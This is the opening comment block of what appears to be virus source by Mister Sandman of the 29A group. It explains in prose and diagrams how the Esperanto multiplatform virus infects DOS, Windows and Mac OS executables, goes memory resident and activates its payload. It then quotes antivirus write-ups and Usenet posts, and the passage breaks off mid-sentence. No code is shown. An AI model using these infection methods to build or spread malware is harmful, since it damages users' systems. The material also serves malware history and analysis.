;
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;   ³        /\/\/\/\/ Esperanto \/\/\/\/\        ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;   ³        written by Mister Sandman/29A         ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;   ³  A MULTIPROCESSOR and MULTIPLATFORM virus   ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;
; 0. Introduction
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Welcome to Esperanto, world's first multiprocessor and multiplatform virus
; ever, which is (pretty obviously) my best virus so far. It took me several
; months to write it, assemble the whole thing, and put it together into one
; only file, id est, the virus binary. In every moment i tried to write such
; a clear, modulized, easily understandable code to the detriment of optimi-
; zation. However i'm conscious it's necessary to write a previous deep ana-
; lysis so everybody may clearly understand the 100% of its functioning.
;
;
; 1. Processors/platforms/objects
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Esperanto is able to run in three different kinds of processors, which are
; Intel 80x86 (used in common PCs), Motorola 680x0 (used in old Apple Macin-
; tosh computers and in new Macintosh Performa) and PowerPC 6xx (used in new
; Power Macintosh and PowerBook computers).
;
; Inside each of these processors  it is able  to work  in several different
; platforms, thus, in Intel  80x86 processors it will run under DOS, Windows
; 3.1x, Windows95, WindowsNT and Win32s, and in Motorola and PowerPC it will
; run under any version of Mac OS (since early 6.x up to the recently relea-
; sed Mac OS 8, which  has been fully  tested under); albeit Amiga computers
; use also Motorola processors, Esperanto will not be able to work in them.
;
; And now finally, depending on the platform Esperanto is being executed in,
; it will infect several  different objects; when running in DOS and Windows
; 3.1x it will infect: COM, EXE, NewEXE, and PE files. Under Windows95, Win-
; dowsNT and Win32s (Win32 from now onwards) it will infect COM, EXE, and PE
; files. Finally, when run under Mac OS, it will infect Mac OS applications,
; including  extensions, control panels, the System File, the Mac OS Finder,
; the DA Handler, and, if available, the Desktop File (only in Mac OS <7).
;
; The following diagram is pretty useful to understand the above:
;
;
;                   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄ DOS ÄÄÄÄÄÄ COM, EXE, NewEXE, PE
;        ÚÄÄÄÄÄÄÄÄÄ³ Intel 80x86 ÃÄÄÄÅÄ Win 3.1x Ä COM, EXE, NewEXE, PE
;        ³          ³    (PCs)    ³   ÀÄ Win32 ÄÄÄÄ COM, EXE, PE
;        ³          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;        ³         ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;  ÚÄÄÄÄÄÁÄÄÄÄÄ¿   ³ Motorola 680x0 ³
;  ³ Esperanto ÃÄÄ³   (Old Macs)   ÃÄ¿            ÚÄ Mac OS Apps
;  ÀÄÄÄÄÄÂÄÄÄÄÄÙ   ³ (Mac Performa) ³ ³            ÃÄ System File
;        ³         ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ ÃÄ Mac OS ÄÄÅÄ Mac OS Finder
;        ³          ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  ³            ÃÄ DA Handler
;        ³          ³ PowerPC 6xx  ³  ³            ÀÄ Desktop File
;        ÀÄÄÄÄÄÄÄÄÄ³ (Power Macs) ÃÄÄÙ                (Mac OS <7)
;                   ³ (PowerBooks) ³
;                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
;
; 2.0. Internal structure
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Esperanto gets the compatibility  and the  portability between these three
; different processors by means of the strategyc  use of its internal struc-
; ture, so it's completely necessary to see what does it consist on in order
; to understand the way Esperanto works.
;
; Maybe the first question which comes up to your  mind is something similar
; to "how the fuck  can it jump from PCs to Macintoshes?". Theoretically, it
; would be impossible, as PC applications are compiled for Intel processors,
; which use different opcodes than the ones used by Motorola and/or PowerPC.
; But practically it was  possible, by means  of some  tricks. I will try to
; explain them all point by point.
;
; a) How can a PC executable file jump into a Mac? Mac OS uses something si-
;    milar to drivers, called  "extensions". Since many  time ago Mac OS in-
;    cludes an  extension  called "PC Exchange", which is  loaded by default
;    and is able to read and write any PC disk. Since then lots of Macintosh
;    users, by means of DOS and Win emulators, use lots of PC files in their
;    Macs. The first step is, as you can see, done.
;
; b) How can Esperanto infect under Mac OS? well, this requires some theory.
;    Mac OS executable files consist  on definite-purpose resources (such as
;    CODE, MDEF (Menu DEFinition), BNDL (bundle), etc). Every executable fi-
;    le in Mac OS has a resource index or relocation at its end, and this is
;    what the operating system looks for in  order to distinguish executable
;    and non-executable files. One of these resource indexes has been "arti-
;    ficially" added to the end of the Esperanto body. This item does not do
;    anything under any PC platform, but it does force Mac OS to execute in-
;    fected PC programs in Macs. When going to run  any of these PC programs
;    under one of  the known DOS or Win emulators, Mac OS will recognize the
;    executable format and then will run the infected file with no emulation
;    so Esperanto will go memory resident under Mac OS. After this, the con-
;    trol will be given back to the Intel emulator and then the infected fi-
;    le will be normally executed, being possible to stay memory resident in
;    the virtual memory used by the DOS or Win emulator as well.
;
; c) But aren't the opcodes of each processor different? indeed. And that is
;    why Esperanto has a specific infection routine  for Mac OS applications
;    totally written and compiled in Motorola 680x0 code. This submodule was
;    incrusted into the main Esperanto body and is pointed by the previously
;    mentioned resource index. When an infected application is run in Mac OS
;    after having been recognized as an executable file the operating system
;    first checks the resource  index. A pointer  to a MDEF resource will be
;    found in it, and then  the execution will jump straight to the starting
;    offset pointed to in the resource index, where the  so called "jump ta-
;    ble" is supposed to be. This  jump  table  is another characteristic of
;    Mac OS applications, and its mission consists on managing the hierarchy
;    of the execution  of the different resources in a file. This jump table
;    does not actually exist in Esperanto; instead of it there is a jmp ins-
;    truction (Intel-opcoded) which in PCs will jump to the virus real start
;    and in Macintoshes will be interpreted as non-sense data, so it will be
;    skipped... until the next instruction, a Motorola one, is reached. That
;    is the first instruction of the Mac OS module which, consequently, will
;    be run as execution goes on. Our objective is done.
;
; d) And how can the virus run in PowerPC processors? since these processors
;    are used in Power Macintosh and PowerBook  computers, in Apple they had
;    to look for some kind  of compatibility between old applications (which
;    were compiled for Motorola) and  the new processors, so they eventually
;    came up with the idea  of including a Motorola code emulator inside the
;    new Mac OS kernel. Since then there's a full compatibility between both
;    processors and their applications, and that's why Esperanto is able too
;    to work in PowerPC-based machines which use Mac OS.
;
; e) How can Esperanto jump from Macs to PCs? also very easy. The virus will
;    infect every PC file it finds in the DOS/Win emulator and as soon as o-
;    ne of these files is copied to a PC the work will be done. And remember
;    there's no necessity of any floppy disks, as it's usual to find PC com-
;    puters connected to Macintoshes by networking means. That's why none of
;    the "foreign" infections (of Mac apps in PC, and of PC files in Mac OS)
;    was included in the virus, as they would be a loss of bytes.
;
; Once this all is understood it  is much simpler to understand the internal
; structure of the virus. Esperanto consists  on four  different modules and
; four entry points. There is a specific  virus module for Mac OS, DOS, Win,
; and Win32. And there is one entry point for each of them: the first one is
; "universal", it's the one we've just described above. It is valid for COM,
; EXE and Mac OS apps, and it is formed  only by a simple "jmp" instruction,
; whose mission consists on "discriminating" the processor it is working un-
; der and, depending on that, distributing the execution point either to the
; start of the  Mac OS module or to the start of the DOS one. The second en-
; try point is the one straight reached in  this last  case, and it is valid
; only  for COM and EXE files. The  third entry point is the one used by the
; Windows 3.1x module, and finally the fourth deals with the Win32 code.
;
; Again, the use of a diagram will make things much simpler to understand:
;
;
;          ÚÄÄÄÄÄÄ¿
;        ÚÄÅÄÄÄÄÄÄÅÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÄÄ Universal entry point
;        ³ ÀÄÄÄÄÄ³ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÃÄÄ Mac OS entry point
;        ³        ³ÛÛÛÛ Mac OS ÛÛÛÛ³
;        ³        ³ÛÛÛÛ module ÛÛÛÛ³
;        ³        ³ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ³
;        ÀÄÄÄÄÄÄÄ³±±±±±±±±±±±±±±±±ÃÄÄ COM/EXE entry point
;                 ³±± DOS module ±±³
;                 ³±±(not memres)±±³
;          ÚÄÄÄÄÄÄ´±±±±±±±±±±±±±±±±³
;        ÚÄÅÄÄÄÄÄÄ´°°°°°°°°°°°°°°°°ÃÄÄ NewEXE entry point
;        ³ ³      ³°° Win module °°³
;        ³ ³      ³°°°°°°°°°°°°°°°°³
;        ³ ÀÄÄÄÄÄ³±±±±±±±±±±±±±±±±ÃÄÄ DOS memory resident code
;        ÀÄÄÄÄÄÄÄ³±± DOS module ±±ÃÄÄ 16-bit infection routines
;                 ³±±(memory res)±±³
;                 ³±±±±±±±±±±±±±±±±³
;                 ³²²²²²²²²²²²²²²²²ÃÄÄ PE entry point
;                 ³²² W32 module ²²³
;                 ³²²²²²²²²²²²²²²²²³
;                 ³++++++++++++++++ÃÄÄ Data buffer
;                 ³+++++ Data +++++³
;                 ³++++++++++++++++³
;                 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
;
; 2.1. The Mac OS module
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This module (Motorola-opcoded) was written and compiled in a Mac computer.
; It has the format of a MDEF resource. It's executed every time an infected
; application is run under Mac OS. When this happens the module will perform
; the System File infection, so that the virus will be loaded every time the
; user boots from his hard disk. Then it will give control back to the host.
;
; From this moment onwards the virus will rapidly spread all over the system
; in a "chain" process: after its host has been run, the System File (remem-
; ber, previously infected) will call and then infect the Mac OS Finder. The
; Finder, in its turn, will infect *any* accessed file (findfirst, findnext,
; open, close, chmod...), and this includes the DA Handler, the Desktop File
; (if available, only in Mac OS <7), control panels, extensions, etc.
;
; Infection consists on simply adding a new MDEF resource to the victims and
; copying the whole viral code into it, setting execution priviledges to the
; resource with ID=0. Esperanto will not go memory resident twice.
;
; I think it would be fair to say that this was probably the part of the vi-
; rus whose writing i enjoyed most as i had to develop it all myself because
; there are not any tutorials on Mac OS infection (as far as i know).
;
;
; 2.2.0. The DOS module
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This module uses 16-bit Intel code, and  was specifically  designed to run
; in DOS. It has the peculiarity of being divided into two different chunks,
; each of them  with a different mission. Now i'll try to describe the func-
; tioning and the behavior of both of these DOS submodules.
;
;
; 2.2.1. The DOS runtime module
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This submodule is executed every time  an infected COM or EXE file is run.
; When this happens, the DOS runtime module will try to perform two actions:
; first, become memory resident by hooking interrupt 21h; and second, resto-
; re its host in order to let it be executed.
;
; The residency method is completely standard, as the virus first checks for
; its presence in memory (in order to not to go resident twice), and if this
; is ok  then creates a new MCB, sets it as a system one used by DOS, copies
; its code into it and then jumps to this copy, so no ëelta-offset is longer
; needed. Once this happens it will hook interrupt 21h, setting the new vec-
; tor to the start of  the DOS memory resident  module, and  then will check
; for the file format of its host, in order to rebuild and jump to it.
;
;
; 2.2.2. The DOS memory resident module
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This submodule is executed every time the interrupt 21h is called once the
; virus has previously gone memory resident. Esperanto intercepts only three
; functions: its own interrupt service (a ":)" smiley), the findfirst servi-
; ce (4eh) and the findnext service (4fh). If the int call does not hold any
; of these services as request, the virus will jump to the original int 21h.
;
; Instead, Esperanto will perform several actions when having intercepted a-
; ny of the functions in hooks. When the value held in AX is equal to 3a29h,
; which stands for a ":)" smiley, it will increment AH so the eyes will turn
; into a ";)" wink. This is used for the residency check to not to go memory
; resident twice. The execution will then jump to the original interrupt.
;
; If the value held in AH is equal to 4eh or 4fh (findfirst/findnext), Espe-
; ranto will try to set up the  file for its infection. The virus will first
; store the full path and the filename, and later will check  its extension.
; If the extension is .COM or .EXE, Esperanto will continue running the cor-
; responding  routines encharged  of examining the file and determining whe-
; ther it is infectable or not. Otherwise  it will hand the control over the
; original interrupt service by means of a "retf" instruction.
;
;
; The 16-bit infection routines
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; For the case the latter didn't happen, Esperanto is about to check the fi-
; le in DS:DX in order to know if it is worth to be infected or not. But be-
; fore doing any specific file check (which would depend  on its extension),
; the virus does a call to the "system_checks" routine. This routine is kind
; of an "infection limiter", used in order to avoid the virus presence being
; unveiled because of  the system slowdown which  would happen if there were
; no limits when infecting files. Thus, Esperanto will infect from 0 up to 3
; files per (a maximum of a) minute. If the "system_checks" routine does not
; return a 0 in AH, then Esperanto  has not infected 3 files yet in the same
; minute, so it may keep on seeking for victims.
;
; Now, if the possible victim  is a COM file, the virus will check first for
; its infection mark (a ";)" smiley) in the offset 4 of the file. If this is
; ok then it will just assure itself the file is bigger than 5733 (the virus
; size+1000) and smaller than 59802 (65535-the virus size-1000). If the file
; has passed all the tests then it's good to be infected: 4733 bytes will be
; appended to its end and it will have a new 5 bytes long header (jmp+";)").
;
; The conditions required for EXE files are different. The virus will see if
; the first word in the file is MZ or ZM. Later it will check for its infec-
; tion mark, any overlay, and the presence of PkLite. If nothing goes bad it
; will then skip the file if it's smaller than 5733 (Esperanto+1000) and fi-
; nally will see if it is a Windows EXE file. For the case it is not the vi-
; rus will modify CS, IP, SS and SP besides other pointers in the MZ header,
; and then append itself to the end of the file.
;
; If it is about a Windows EXE file, it will decrement the pointer in 3ch to
; the new EXE header by 8, and then rewrite the MZ header. This new EXE hea-
; der will be read (512 bytes) and then Esperanto will check for the NE (for
; NewEXEs) or PE (for PEs) mark. If a different  mark (LE, LX...)  is found,
; the file will be rejected, and the original header rebuilt. If it is about
; a NewEXE, the virus will check straight for the gangload area. If it is ok
; then Esperanto will infect the file: first it will update all the pointers
; related with the segment table, as it will be shifted. Later, the gangload
; area will be killed for compatibility, and the  new CS:IP will be set. Fi-
; nally the NE header and the segment table will be shifted by 8 and the vi-
; ral code plus the relocation item appended to the end of the file.
;
; Finally, if the file turns out to be a PE the virus will read again the MZ
; header of the file and readd 8 to the pointer in 3ch. A page from the off-
; set pointed by the latter will be read again (ie, the PE header), and then
; the checks will start again. These consist on checking if the file is exe-
; cutable and if it's not a DLL. After  this, Esperanto looks for the import
; section in the file, reads it, and then looks  for the KERNEL32.DLL module
; descriptor. Files which do not import any API from it will consequently be
; discarded, as well  as binded files. The final  step before infection con-
; sists  on storing in  a dynamic variable the RVAs for the GetModuleHandleA
; and GetProcAddress APIs. Once these steps are done the victim is ready for
; infection. The  virus will  attach itself as an extension of the last sec-
; tion in the file, and then will modify the AddressOfEntryPoint field so it
; points to the start of the virus, the section characteristics to exec/read
; /write, and the SizeOfImage field. And, of course, the virus will then ap-
; pend its body to the end of the file.
;
;
; 2.3. The Windows 3.1x module
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This module is executed every time an infected NewEXE file is run. It will
; first of all get an alias selector for CS and point it with DS. As soon as
; this is done it will use its own runtime routines in order to look for so-
; me files (COM and EXE) to infect. To save bytes, the module shares the sa-
; me infection routines used  by the DOS module (read the "The 16-bit infec-
; tion routines" point for further information). As soon as the maximum num-
; ber of files to infect (according to  the virus limiter) is reached, Espe-
; ranto will jump to the original CS:IP of its host.
;
;
; 2.4. The Win32 module
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This last module is executed every time an infected PE file is run. It was
; written and compiled in 32-bit protected mode, and that is what it is able
; to work in: Win32 platforms (Win32s/Windows95/WindowsNT). When it's execu-
; ted it first gets the base address  of its  host and pushes its real entry
; point, and later performs several actions in order to  stay compatible and
; portable between all the Win32 platforms. These actions consist on getting
; the previously stored RVA of GetModuleHandleA and  calling this API in or-
; der to  get the address of the KERNEL32 module, and later getting the also
; previously stored RVA of GetProcAddress in order to use it  and thus be a-
; ble to get the address of all the APIs needed by Esperanto. If the RVAs of
; GetModuleHandleA and GetProcAddress were not stored for some reason, Espe-
; ranto would use its own undocumented routines in order to get the base ad-
; dress of KERNEL32 and, inside  the export table of the latter, the address
; of the GetProcAddress API function.
;
; Once these steps are done Esperanto calls the GetLocalTime API in order to
; know if the current date is  the one required by  the payload to activate.
; This payload and its effects are fully described below. If the date is not
; the one the payload needs to activate then the execution will continue and
; the virus will  use the FindFirstFileA/FindNextFileA APIs in order to find
; some files to infect. Again, the infection will be controlled and Esperan-
; to will hit a maximum of three files per run. The checks performed by this
; module are the same than the ones performed by the DOS module, and the in-
; fection routines consist on exactly the same, besides in two points: first
; of them is the fact that this module uses  file mapping in memory in order
; to make things easier and save bytes; and second  is that this module does
; not infect  NewEXE files, as divisions with 32-bit integers when DX is not
; equal to zero  cause troubles; the solution would be either only infecting
; NewEXEs < 0ffffh (as done with EXEs) or making a 16-bit division. I didn't
; like any of them so i avoided a headache just by skipping NewEXE files.
;
;
; 2.5. Union makes the power
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; It's not about the fact that this virus has been written to be in the wild
; or shit like that. In fact i did not take care about restoring file attri-
; butes, date or time, because i wrote this just to "prove my point", not to
; release it and let it survive in  the  wild, so i don't care it being easy
; to  detect or unveiling  its presence. It was just a challenge for myself,
; not a defiance for innocent average-level computer users.
;
; It's about its versatility. You could see the virus consists on four modu-
; les. Each of those modules was written individually and thus would be able
; to work with no need of the presence of the resting modules (except of the
; Windows 3.1x one, which shares its infection routines because of optimiza-
; tion reasons). Separately they would be normal infectors. But they all to-
; gether are a unique virus in its class. For the same reason, the infection
; ratio and the versatility of the virus are much bigger than if it would be
; separated into independent modules: the DOS module goes memory resident in
; order to infect files while the Windows 3.1x and the Win32 ones use runti-
; me infection. But what happens if the virus (the DOS module) is memory re-
; sident and Windows 3.1x or a Win32  platform is loaded? the result is that
; Esperanto will then use both memory *and* runtime infection as the DOS mo-
; dule is able to stay resident also under Windows and both Windows 3.1x and
; Win32 call the original 4eh/4fh services of interrupt 21h in order to find
; files. Esperanto would be, as you can see, much more infectious. And don't
; see this as a remote possibility, as WIN.COM is usually the first file the
; virus infects from its Windows 3.1x module, for instance.
;
; Finally i would like to add a clarification about the virus. You will pro-
; bably find strange or non-sense things on it, or even things you can't un-
; derstand or think they're wrong or could be improved. And you will kind be
; right and kind be wrong... "they are not bugs, they are features". What do
; are bugs are some included on purpose in order to stop the virus spreading
; fast so it can't go too far in the wild.
;
; Note again that the purpose of this virus is not to infect people and thus
; become widespread in the wild; its real objective is summed up in the pre-
; tty famous Nike slogan... "just do it" ;)
;
;
; 3. Payload
; ÄÄÄÄÄÄÄÄÄÄ
; This virus took its name after the universal language Esperanto. This lan-
; guage was invented in 1887 by L.L.Zamenhof, a polish doctor. Esperanto was
; designed to be the second language of everyone, and then was invented with
; no irregularities and/or exceptions, so everybody would be able to rapidly
; and easily learn it and communicate with other Esperanto speakers. It ini-
; tially had a lot of success, but its growing process was stopped by the II
; World War as lots of its speakers died in it. Since about ten years ago it
; is experiencing a new peak, and its use has been recommended many times by
; international organisms such as UNESCO, which also stress its paedagogy as
; Esperanto, once learnt, makes the learning process of other languages much
; easier. Today, Esperanto is spoken by about ten million people.
;
; I found some parallelism between this language and my virus because as the
; language goes beyond any culture, race or whatsoever the virus goes beyond
; any processor, platform or file format. And also because i personally sup-
; port and speak Esperanto it seemed to me the perfect name for my virus.
;
; The payload activates every year on july 26th, which was the release date,
; in 1887, of "Internacia Lingvo" (International Language), by Zamenhof, the
; first book written in Esperanto. Today there are over ten thousand titles.
; The virus payload will activate only when running in a Win32 platform, and
; consists on showing the text below within a message box. When the user ac-
; cepts the "ok" button the virus jumps straight to the host, without infec-
; ting any file (that's its only vacancy time).
;
;
;        Never mind your culture / Ne gravas via kulturo,
;        Esperanto will go beyond it / Esperanto preterpasos gxin;
;        never mind the differences / ne gravas la diferencoj,
;        Esperanto will overcome them / Esperanto superos ilin.
;
;        Never mind your processor / Ne gravas via procesoro,
;        Esperanto will work in it / Esperanto funkcios sub gxi;
;        never mind your platform / Ne gravas via platformo,
;        Esperanto will infect it / Esperanto infektos gxin.
;
;        Now not only a human language, but also a virus...
;        Turning impossible into possible, Esperanto.
;
;
; What reads after the slash in every line is, of course, the translation of
; the english "verse" into Esperanto. And yes, i know it looks strange :)
;
;
; 4.0 The "other side"
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; It has only passed one week after having sent the virus to two AVers. This
; is what we could get from them by the moment. Further reports and analyses
; will be referenced in the next issue of 29A.
;
;
; 4.1. Mikko Hypp”nen speaks (F-Prot)
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; (*) http://www.DataFellows.com/v-descs/esperant.htm
;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
; NAME: Esperanto
; TYPE: Resident COM/EXE-files
;
; This virus infects lots of different executables:
;
; When running in DOS and Windows 3.1x it will infect:
;  - DOS COM files
;  - DOS EXE files
;  - Windows 3.x NewEXE files,
;  - Windows 95 PE EXE files
;  - Windows NT PE EXE files
;
; When running in Windows 95, Windows NT and Win32s it will infect:
;  - DOS COM files
;  - DOS EXE files
;  - Windows 95 PE EXE files
;  - Windows NT PE EXE files
;
; The virus carries a dropper of a Macintosh virus in it's code.
; This will work under Mac and PowerMac and will infect:
;  - Mac OS applications
;  - Extensions
;  - Control panels
;  - The System File
;  - The Mac OS Finder
;  - The DA Handler
;  - The Desktop File
;
; When Esperanto is running on a PC, it will stay resident and infect
; programs when they are accessed.
;
; When such COM and EXE files are taken to a Macintosh or a PowerMac and
; executed under a PC emulator such as SoftPC or SoftWindows, they will
; execute as Mac programs. This happens because Esperanto adds a special
; resource-like add-on to PC files. Such programs will drop a Mac-specific
; virus which will continue spreading on Macintosh computers. The Mac
; version of the virus will not spread back to PC users. PC version of
; the virus won't infect Mac executables directly even if it would
; have access to them through floppies or file sharing.
;
; Esperanto activates every year on July 26th. The first book in the
; international Esperanto language was released on this date. When an
; infected file is executed under Windows 95 or Windows NT on this date,
; the virus will show a dialog box with the following texts:
;
;        Never mind your culture / Ne gravas via kulturo,
;        Esperanto will go beyond it / Esperanto preterpasos gxin;
;        never mind the differences / ne gravas la diferencoj,
;        Esperanto will overcome them / Esperanto superos ilin.
;
;        Never mind your processor / Ne gravas via procesoro,
;        Esperanto will work in it / Esperanto funkcios sub gxi;
;        never mind your platform / Ne gravas via platformo,
;        Esperanto will infect it / Esperanto infektos gxin.
;
;        Now not only a human language, but also a virus...
;        Turning impossible into possible, Esperanto.
;
; The Mac version of Esperanto was the first new Mac virus for over two
; years when it was discovered in November 1997.
;
; [Analysis: Mikko Hypponen, Data Fellows Ltd]
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
;
; 4.2. Eugene Kaspersky speaks (AVP)
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; (*) http://www.avp.ch/avpve/file/e/esperant.stm
;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
; Esperanto.4733
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This is a multiplatform parasitic virus. It infects DOS COM and EXE,
; Windows EXE (NE) and Windows32 EXE (PE) files. It also has a part of
; code that looks like a MDEF Macintosh resource and seems to be also a
; virus for the Macintosh. I see no way for that virus to spread from
; Macintosh to PC, and from PC to Macintosh - being executed as DOS/Win
; application the virus pays no attention for Mac files. It seems to be
; the same for infected Mac programs - the virus does not pay attention
; for DOS/Win files. I think that the only way to spread that virus from
; Mac to PC and back is to copy and run it "manually".
;
; When an infected file is executed under DOS, the virus hooks INT 21h and
; stays memory resident. When files are executed or accessed by FindFirst/
; Next DOS calls, the virus infects them. The virus also searches for COM
; and EXE files and infects them. Being executed as Windows or Windows32
; application, the virus does not leave its TSR copy in the memory - it
; just searches for files and infects them.
;
; While infecting the virus parses internal file format, separates DOS COM,
; EXE, NewEXE and Portable EXE files and infects them in different ways:
; writes itself to the end of DOS COM and EXE files and modifies file
; header, creates new section in Windows NE files, appends itself to the
; last section in Windows32 PE files.
;
; Being executed as Windows32 application the virus also checks the system
; time and depending on it displays the MessageBox:
;
;  [Esperanto, by Mister Sandman/29A]
;  Never mind your culture / Ne gravas via kulturo,
;  Esperanto will go beyond it / Esperanto preterpasos gxin;
;  never mind the differences / ne gravas la diferencoj,
;  Esperanto will overcome them / Esperanto superos ilin.
;
;  Never mind your processor / Ne gravas via procesoro,
;  Esperanto will work in it / Esperanto funkcios sub gxi;
;  never mind your platform / Ne gravas via platformo,
;  Esperanto will infect it / Esperanto infektos gxin.
;
;  Now not only a human language, but also a virus...
;  Turning impossible into possible, Esperanto.
;
; The virus also contains the text strings that are used while infecting
; Windows32 files:
;
;  KERNEL32.DLL USER32.DLL GetModuleHandleA GetProcAddress MessageBoxA
;  CreateFileA CreateFileMappingA MapViewOfFile UnmapViewOfFile CloseHandle
;  FindFirstFileA FindNextFileA FindClose LoadLibraryA GetLocalTime
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
;
; 4.3 Keith Peer speaks (AVP)
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; (*) alt.comp.virus
;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
; From - Sat Nov 22 02:03:41 1997
; From: Keith Peer <keith@command-hq.com>
; Newsgroups: alt.comp.virus
; Subject: New Multi-Operating System virus discovered!
; Date: Thu, 20 Nov 1997 12:54:01 -0500
; Organization: Central Command Inc.
; To: virus-l@lehigh.edu
;
; November 20, 1997
;
; FOR IMMEDIATE RELEASE
;
; Renee Barnhardt
; Central Command Inc.
; 330-273-2820
; renee@command-hq.com
;
; Central Command today announces the discovery of new multi-operating
; system virus.
;
; New cross platform virus that can infect all popular desktop computers.
;
; Brunswick, OH, November 20, 1997 Central Command Inc. the U.S. distributor
; for AntiViral Toolkit Pro (AVP) announces today that a new computer virus
; has been discovered that can operate under DOS, Windows, Windows 95,
; Windows NT, and Macintosh operating systems.
;
; "We are seeing a lot of new technology in computer viruses today. It seems
; that the virus writers are concentrating more on developing sophisticated
; viruses that extend further and infect more widely. I am sure this will
; not be the last virus we encounter that can infect DOS, Windows, Windows
; 95, Windows NT, and Macintosh operating systems, but right now this is
; the first." Said Central Command's President, Keith Peer.
;
; This multiplatform parasitic virus named Esperanto.4733, infects DOS, COM
; and EXE programs, Windows EXE (NE) and Windows32 EXE (PE) files. It also
; has instructions that look for MDEF Macintosh resources and also operates
; under the Macintosh environment. There is no way for this virus to spread
; from Macintosh to PC, and from PC to Macintosh. When a infected program
; is started as a DOS or Windows application the virus does not execute the
; Macintosh instructions. The same effect happens when a infected Macintosh
; program is started, the virus simply ignores the DOS, and Windows
; instructions. Currently, the only way for this virus to spread from a PC
; to a Macintosh is by copying it.
;
; While infecting the virus searches the internal file format of the
; programs, and separates DOS, COM and EXE programs, Windows, Windows 95,
; Windows NT, and Macintosh programs and infects differently.
;
; [...Publicity...]
;
; ---------------------------------------------------------
; Central Command Inc.                AntiViral Toolkit Pro
; http://www.command-hq.com            sales@command-hq.com
; Ph: 330-273-2820                        Fax: 330-220-4129
;  ->  See our website for free software evaluations!  <-
; ---------------------------------------------------------
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
;
; 4.4. Guillermito speaks ;)
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; (*) alt.comp.virus
;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
; From - Sat Nov 22 02:04:19 1997
; From: Guillermito <guillermito@pipo.com>
; Newsgroups: alt.comp.virus
; Subject: Re: New Multi-Operating System virus discovered!
; Date: Fri, 21 Nov 1997 09:16:28 +0100
; Organization: INRA des Villes
;
; Keith Peer wrote:
;
; > This multiplatform parasitic virus named Esperanto.4733, infects DOS,
; > COM and EXE programs, Windows EXE (NE) and Windows32 EXE (PE) files. It
; > also has instructions that look for MDEF Macintosh resources and also
; > operates under the Macintosh environment.
;
; Hey MrSandman! Lo has conseguido! Que cojonudo, tio!
;
; Cabanas/Esperanto: 29A is the best virus group on earth.
;
; --
; Guillermito
; http://www.pipo.com/guillermito/darkweb/virus.html
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
; My reply: lo tuyo s¡ que se sale... ;) Espero verte de nuevo en la pr¢xima
; reuni¢n de 29A este verano, a ver si esta vez no te pierdes en Madrid ;)
;
; Btw, the guys at AVP don't seem to have understood very well the way Espe-
; ranto jumps from a PC to a Macintosh computer. I would also like to make a
; special mention to Alan Sollomon (aka Alan Salmon), who, resentful for not
